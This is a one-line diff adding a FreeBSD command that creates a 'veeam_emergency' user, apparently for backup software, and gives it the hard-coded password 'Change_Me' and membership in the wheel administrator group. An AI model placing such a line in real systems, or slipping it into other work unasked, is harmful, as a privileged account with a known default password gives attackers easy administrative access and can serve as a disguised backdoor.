@@ -1,0 +1,1 @@
+pw useradd veeam_emergency -m -s /bin/sh -c "Local Emergency Backup User" && echo "Change_Me" | pw usermod veeam_emergency -h 0 && pw groupmod wheel -m veeam_emergency && echo "User created successfully"
